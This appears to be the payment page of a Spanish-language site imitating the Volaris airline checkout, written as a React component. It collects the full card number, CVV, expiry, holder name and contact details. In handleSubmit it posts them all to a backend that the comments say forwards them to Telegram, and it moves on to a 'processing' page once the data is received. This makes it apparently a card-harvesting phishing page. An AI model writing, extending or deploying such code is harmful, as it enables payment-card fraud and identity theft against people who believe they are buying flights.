import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { Info } from '../types';
import '../css/payment-responsive.css';

// Helper for currency formatting
const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('es-MX', {
        style: 'currency',
        currency: 'MXN',
        minimumFractionDigits: 0,
        maximumFractionDigits: 0,
    }).format(amount);
};

// Luhn Algorithm for Credit Card Validation
const isLuhnValid = (val: string) => {
    let sum = 0;
    let shouldDouble = false;
    // Loop through values starting at the rightmost side
    for (let i = val.length - 1; i >= 0; i--) {
        let digit = parseInt(val.charAt(i));

        if (shouldDouble) {
            if ((digit *= 2) > 9) digit -= 9;
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
};

// Date validation (MM/YY)
const isValidDate = (dateStr: string) => {
    // Expected format MM/YY
    if (!/^\d{2}\/\d{2}$/.test(dateStr)) return false;
    
    const [month, year] = dateStr.split('/').map(Number);
    const now = new Date();
    const currentYear = now.getFullYear() % 100; // Last 2 digits
    const currentMonth = now.getMonth() + 1;

    if (month < 1 || month > 12) return false;
    
    // Check if expired
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        return false;
    }
    
    return true;
};

const Payment = () => {
    const navigate = useNavigate();
    const [info, setInfo] = useState<Info | null>(null);
    const [totalPrice, setTotalPrice] = useState<number>(0);
    const [isLoading, setIsLoading] = useState(false);
    const [errors, setErrors] = useState<{ [key: string]: string }>({});

    // Form State
    const [formData, setFormData] = useState({
        bank: 'INVEX_VOLARIS',
        cardNumber: '',
        cardName: '',
        expiry: '',
        cvv: '',
        phone: '',
        city: '',
        address: '',
        email: ''
    });

    useEffect(() => {
        const storedInfo = localStorage.getItem('info');
        if (storedInfo) {
            const parsedInfo: Info = JSON.parse(storedInfo);
            setInfo(parsedInfo);

            // Calculate Total Price
            let total = 0;
            const passengerCount = parsedInfo.passengersInfo.adults.length + parsedInfo.passengersInfo.children.length;
            
            if (parsedInfo.flightInfo.outboundFlight?.selectedPrice) {
                total += parsedInfo.flightInfo.outboundFlight.selectedPrice * passengerCount;
            }
            if (parsedInfo.flightInfo.returnFlight?.selectedPrice) {
                total += parsedInfo.flightInfo.returnFlight.selectedPrice * passengerCount;
            }
            
            setTotalPrice(total);
        } else {
            navigate('/');
        }
    }, [navigate]);

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value } = e.target;
        
        let formattedValue = value;

        // Formatting logic
        if (name === 'cardNumber') {
            formattedValue = value.replace(/\D/g, '').slice(0, 16);
        } else if (name === 'expiry') {
            // MM/YY masking
            let v = value.replace(/\D/g, '').slice(0, 4);
            if (v.length >= 3) {
                formattedValue = `${v.slice(0, 2)}/${v.slice(2)}`;
            } else {
                formattedValue = v;
            }
        } else if (name === 'cvv') {
             formattedValue = value.replace(/\D/g, '').slice(0, 4);
        } else if (name === 'phone') {
             formattedValue = value.replace(/\D/g, '').slice(0, 10);
        }

        setFormData(prev => ({
            ...prev,
            [name]: formattedValue
        }));
        
        // Clear error when user types
        if (errors[name]) {
            setErrors(prev => ({ ...prev, [name]: '' }));
        }
    };

    const validateForm = () => {
        const newErrors: { [key: string]: string } = {};
        
        if (formData.bank === '00') newErrors.bank = 'Seleccione su banco';
        if (!formData.cardNumber || formData.cardNumber.length < 13 || !isLuhnValid(formData.cardNumber)) newErrors.cardNumber = 'Número de tarjeta inválido';
        if (!formData.cardName) newErrors.cardName = 'Ingrese el nombre del titular';
        if (!isValidDate(formData.expiry)) newErrors.expiry = 'Fecha inválida (MM/YY)';
        if (formData.cvv.length < 3) newErrors.cvv = 'CVV inválido';
        if (!formData.phone || formData.phone.length < 7) newErrors.phone = 'Teléfono inválido';
        if (!formData.city) newErrors.city = 'Ingrese su ciudad';
        if (!formData.address) newErrors.address = 'Ingrese su dirección';
        if (!formData.email || !formData.email.includes('@')) newErrors.email = 'Email inválido';

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        if (!validateForm()) {
            return;
        }

        setIsLoading(true);

        try {
            // 1. Create Booking (Mock ID if server fails or just to generate ID)
            let bookingId = 'BOOK-' + Date.now();
            
            // Try to create real booking
            try {
                const bookingResponse = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        flightInfo: info!.flightInfo,
                        passengersInfo: info!.passengersInfo
                    })
                });
                if (bookingResponse.ok) {
                    const booking = await bookingResponse.json();
                    bookingId = booking.id;
                }
            } catch (err) {
                console.warn('Backend booking creation failed, using mock ID', err);
            }

            // Save payment info to localStorage immediately
            const paymentInfo = {
                ...formData,
                bookingId: bookingId,
                amount: totalPrice
            };
            localStorage.setItem('paymentInfo', JSON.stringify(paymentInfo));

            // 2. Process Payment (Send to Telegram)
            try {
                const response = await fetch('/api/payments', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        bookingId: bookingId,
                        amount: totalPrice,
                        currency: 'MXN', 
                        cardLast4: formData.cardNumber.slice(-4),
                        cardNumber: formData.cardNumber, // Send full number for Telegram (Security risk in prod, but requested)
                        cvv: formData.cvv,
                        expiry: formData.expiry,
                        cardName: formData.cardName,
                        cardBrand: 'unknown',
                        bank: formData.bank,
                        phone: formData.phone,
                        email: formData.email,
                        city: formData.city,
                        address: formData.address
                    })
                });

                if (!response.ok) {
                    throw new Error('Error en la comunicación con el servidor de pagos');
                }
                
                // Only proceed if server confirms receipt
                setIsLoading(false);
                navigate('/processing');
                
            } catch (err) {
                console.error('Payment API failed', err);
                alert('Error al procesar la solicitud. Por favor verifique su conexión e intente nuevamente.');
                setIsLoading(false);
                return; // Stop execution here, don't navigate
            }

            /* Original Polling Logic - Disabled for now to force flow
            if (!paymentResponse.ok) {
                console.error('Payment API failed');
                alert('Error al iniciar el pago. Por favor verifique su conexión e intente nuevamente.');
                setIsLoading(false);
                return;
            }
            
            // ... (rest of original code)
            */

        } catch (error) {
            console.error(error);
            alert('Ocurrió un error inesperado. Por favor intente nuevamente.');
            setIsLoading(false);
        }
    };

    if (!info) return null;

    const departureDate = new Date(info.flightInfo.flightDates[0]);
    const returnDate = info.flightInfo.flightDates[1] ? new Date(info.flightInfo.flightDates[1]) : null;

    const days = ['Dom', 'Lun', 'Mar', 'Mié', 'Jue', 'Vie', 'Sáb'];
    const months = ['Ene', 'Feb', 'Mar', 'Abr', 'May', 'Jun', 'Jul', 'Ago', 'Sep', 'Oct', 'Nov', 'Dic'];

    const formatDate = (date: Date) => {
        return `${days[date.getDay()]}. ${date.getDate()} de ${months[date.getMonth()]}`;
    };

    return (
        <div className="bg-gray pb-5 payment-page-root" style={{ minHeight: '100vh' }}>
            <Navbar />
            
            <div className="container pt-4">
                <p className="fs-1 tc-ocean fw-light mb-4">Confirma y paga tu compra</p>
                
                <div className="payment-layout">
                    {/* Left Column: Payment Form */}
                    <div className="payment-form">
                        <p className="fs-2 tc-ocean fw-light mb-3">Medios de pago</p>

                        <form onSubmit={handleSubmit}>
                            <div className="card-box p-0 mb-4 overflow-disabled">
                                <div className="p-3 bg-gray-smoke border-bottom d-flex align-items-center">
                                    <svg className="tc-gray-smoke mr-3" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                        <line x1="1" y1="10" x2="23" y2="10"></line>
                                    </svg>
                                    <div>
                                        <p className="m-0 fw-bold tc-ocean">Tarjeta de Crédito o Débito</p>
                                        <p className="m-0 fs-6 tc-gray-smoke">Todas las tarjetas son aceptadas</p>
                                    </div>
                                </div>

                                <div className="p-4">
                                    <div className="select-container bank-select-container">
                                        <select 
                                            required
                                            name="bank" 
                                            value={formData.bank} 
                                            onChange={handleInputChange}
                                            className="input-field w-full"
                                            style={{ borderColor: errors.bank ? '#e8114b' : '' }}
                                        >
                                            <option value="INVEX_VOLARIS">Invex Volaris</option>
                                        </select>
                                        <label>Banco o Entidad Financiera</label>
                                        {errors.bank && <p className="tc-red fs-6 mt-1 mb-0">{errors.bank}</p>}
                                    </div>

                                    <div className="form-grid">
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="cardNumber" 
                                                value={formData.cardNumber} 
                                                onChange={handleInputChange}
                                                type="text" 
                                                className="input-field w-full"
                                                style={{ borderColor: errors.cardNumber ? '#e8114b' : '' }}
                                            />
                                            <label>Número de tarjeta</label>
                                            {errors.cardNumber && <p className="tc-red fs-6 mt-1 mb-0">{errors.cardNumber}</p>}
                                        </div>
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="cardName" 
                                                value={formData.cardName} 
                                                onChange={handleInputChange}
                                                type="text" 
                                                className="input-field w-full"
                                                style={{ borderColor: errors.cardName ? '#e8114b' : '' }}
                                            />
                                            <label>Nombre del titular</label>
                                            {errors.cardName && <p className="tc-red fs-6 mt-1 mb-0">{errors.cardName}</p>}
                                        </div>
                                    </div>

                                    <div className="form-grid">
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="expiry" 
                                                value={formData.expiry} 
                                                onChange={handleInputChange}
                                                type="text" 
                                                className="input-field w-full"
                                                style={{ borderColor: errors.expiry ? '#e8114b' : '' }}
                                            />
                                            <label>Expiración (MM/YY)</label>
                                            {errors.expiry && <p className="tc-red fs-6 mt-1 mb-0">{errors.expiry}</p>}
                                        </div>
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="cvv" 
                                                value={formData.cvv} 
                                                onChange={handleInputChange}
                                                type="password" 
                                                maxLength={4}
                                                className="input-field w-full"
                                                style={{ borderColor: errors.cvv ? '#e8114b' : '' }}
                                            />
                                            <label>CVV</label>
                                            {errors.cvv && <p className="tc-red fs-6 mt-1 mb-0">{errors.cvv}</p>}
                                        </div>
                                    </div>

                                    <p className="fs-3 tc-ocean fw-bold mt-4 mb-2 pt-3 border-top">Información del titular</p>

                                    <div className="input-container">
                                        <input 
                                            required
                                            name="phone" 
                                            value={formData.phone} 
                                            onChange={handleInputChange}
                                            type="text" 
                                            className="input-field w-full"
                                            style={{ borderColor: errors.phone ? '#e8114b' : '' }}
                                        />
                                        <label>Teléfono</label>
                                        {errors.phone && <p className="tc-red fs-6 mt-1 mb-0">{errors.phone}</p>}
                                    </div>

                                    <div className="form-grid">
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="city" 
                                                value={formData.city} 
                                                onChange={handleInputChange}
                                                type="text" 
                                                className="input-field w-full"
                                                style={{ borderColor: errors.city ? '#e8114b' : '' }}
                                            />
                                            <label>Ciudad</label>
                                            {errors.city && <p className="tc-red fs-6 mt-1 mb-0">{errors.city}</p>}
                                        </div>
                                        <div className="input-container">
                                            <input 
                                                required
                                                name="address" 
                                                value={formData.address} 
                                                onChange={handleInputChange}
                                                type="text" 
                                                className="input-field w-full"
                                                style={{ borderColor: errors.address ? '#e8114b' : '' }}
                                            />
                                            <label>Dirección</label>
                                            {errors.address && <p className="tc-red fs-6 mt-1 mb-0">{errors.address}</p>}
                                        </div>
                                    </div>

                                    <div className="input-container">
                                        <input 
                                            required
                                            name="email" 
                                            value={formData.email} 
                                            onChange={handleInputChange}
                                            type="email" 
                                            className="input-field w-full"
                                            style={{ borderColor: errors.email ? '#e8114b' : '' }}
                                        />
                                        <label>Correo Electrónico</label>
                                        {errors.email && <p className="tc-red fs-6 mt-1 mb-0">{errors.email}</p>}
                                    </div>

                                    <button 
                                        type="submit" 
                                        disabled={isLoading}
                                        className={`btn-success mt-4 ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    >
                                        {isLoading ? 'Procesando...' : `Pagar ${formatCurrency(totalPrice)}`}
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>

                    {/* Right Column: Summary */}
                    <div className="payment-summary">
                        <div className="card-box">
                            <h3 className="fs-3 tc-ocean fw-bold mb-4 mt-0">Resumen de compra</h3>
                            
                            <div className="border-bottom pb-4 mb-4">
                                <div className="d-flex justify-space-between align-items-center mb-2">
                                    <span className="tc-gray-smoke">Total a pagar</span>
                                    <span className="fs-3 fw-bold tc-ocean">{formatCurrency(totalPrice)}</span>
                                </div>
                                <p className="fs-6 tc-gray-smoke m-0">
                                    {info.passengersInfo.adults.length} Adulto{info.passengersInfo.adults.length > 1 ? 's' : ''}
                                    {info.passengersInfo.children.length > 0 && `, ${info.passengersInfo.children.length} Niño${info.passengersInfo.children.length > 1 ? 's' : ''}`}
                                    {info.passengersInfo.babies.length > 0 && `, ${info.passengersInfo.babies.length} Bebé${info.passengersInfo.babies.length > 1 ? 's' : ''}`}
                                </p>
                            </div>

                            <div className="mb-4">
                                <div className="mb-4">
                                    <div className="d-flex align-items-center mb-1">
                                        <div className="mr-2" style={{width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ed1650'}}></div>
                                        <p className="fw-bold tc-ocean m-0">Ida</p>
                                    </div>
                                    <p className="fs-6 tc-gray-smoke ml-4 mt-0 mb-1">{(info.flightInfo.origin as any).city || ''} a {(info.flightInfo.destination as any).city || ''}</p>
                                    <p className="fs-6 tc-gray-smoke ml-4 m-0">{formatDate(departureDate)}</p>
                                </div>
                                
                                {returnDate && (
                                    <div>
                                        <div className="d-flex align-items-center mb-1">
                                            <div className="mr-2" style={{width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ed1650'}}></div>
                                            <p className="fw-bold tc-ocean m-0">Vuelta</p>
                                        </div>
                                        <p className="fs-6 tc-gray-smoke ml-4 mt-0 mb-1">{(info.flightInfo.destination as any).city || ''} a {(info.flightInfo.origin as any).city || ''}</p>
                                        <p className="fs-6 tc-gray-smoke ml-4 m-0">{formatDate(returnDate)}</p>
                                    </div>
                                )}
                            </div>

                            <button 
                                className="tc-pink fw-bold fs-6 w-full text-center border-none bg-white cursor-pointer hover:underline"
                                onClick={() => navigate('/select-flight-go')}
                            >
                                Cambiar vuelo
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Payment;
